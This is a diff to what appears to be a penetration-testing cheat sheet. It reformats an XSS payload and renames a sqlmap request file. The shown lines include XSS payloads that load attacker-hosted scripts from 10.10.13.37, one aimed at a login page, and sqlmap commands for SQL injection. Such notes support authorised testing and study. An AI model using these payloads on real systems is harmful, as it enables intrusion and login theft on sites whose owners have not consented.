@@ -114,7 +114,10 @@ fetch("login").then(res => res.text().then(data => {
 
  - External payload: `<script src="http://10.10.13.37/xss.js"></script>`
 
- - Insert script from external: `<img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>`
+ - Insert script from external: 
+ ```shell
+ <img src='x' onerror='const script = document.createElement("script"); script.src="http://10.10.13.37/xss-login.js";document.head.append(script);'>
+ ```
 
 
 ## SQL Injection (SQLi)
@@ -135,7 +138,7 @@ sqlmap -u "$URL/index.php?id=1"
 ```
 
 ### sqlmap POST parameter
-Copy POST request from Burp Suite into `post.txt` file
+Copy POST request from Burp Suite into `post.req` file
 ```shell
-sqlmap -r post.txt -p parameter
+sqlmap -r post.req -p parameter
 ```
